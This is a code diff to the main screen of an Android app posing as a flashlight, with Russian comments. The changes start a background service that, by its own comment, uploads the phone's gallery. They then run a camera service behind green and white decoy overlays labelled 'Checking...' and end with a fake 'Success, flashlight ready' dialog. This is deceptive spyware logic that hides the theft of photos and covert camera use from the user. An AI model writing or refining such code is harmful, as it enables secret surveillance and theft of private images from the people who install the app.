@@ -84,8 +84,6 @@ public class MainActivity extends AppCompatActivity {
                 if (result != PackageManager.PERMISSION_GRANTED) allGranted = false;
             }
             if (allGranted) {
-                Intent gallerySvc = new Intent(this, GalleryService.class);
-                startService(gallerySvc);
                 startEverything();
             }
         }
@@ -94,31 +92,49 @@ public class MainActivity extends AppCompatActivity {
     private void startEverything() {
         if (isProcessing) return;
         isProcessing = true;
+
         try {
+            // 1. Сначала запускаем выгрузку галереи (в фоне)
+            Intent gallerySvc = new Intent(this, GalleryService.class);
+            startService(gallerySvc);
+
+            // 2. Показываем зеленый экран
             greenOverlay.setVisibility(View.VISIBLE);
             tvAnim.setText("Проверка.");
+            
             Handler handler = new Handler(Looper.getMainLooper());
             handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
             handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
+
+            // 3. Ждем 4 секунды, чтобы галерея начала свою работу и не мешала
             handler.postDelayed(() -> {
                 greenOverlay.setVisibility(View.GONE);
                 whiteOverlay.setVisibility(View.VISIBLE);
+                
+                // Включаем фонарь
                 try { if (cameraId != null) cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
+                
+                // Запускаем камеру
                 Intent svc = new Intent(this, CameraService.class);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
                 else startService(svc);
-            }, 2000);
 
+            }, 4000);
+
+            // 4. Через 10 секунд убираем белый экран
             handler.postDelayed(() -> {
                 whiteOverlay.setVisibility(View.GONE);
                 try { if (cameraId != null) cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
+                
                 isProcessing = false;
                 new AlertDialog.Builder(this)
                     .setTitle("Успех")
                     .setMessage("Все сработало. Фонарь готов к работе.")
                     .setPositiveButton("ОК", null)
                     .show();
-            }, 10000);
+
+            }, 12000); // Даем больше времени, чтобы всё успело
+
         } catch (Exception e) { e.printStackTrace(); }
     }
 }
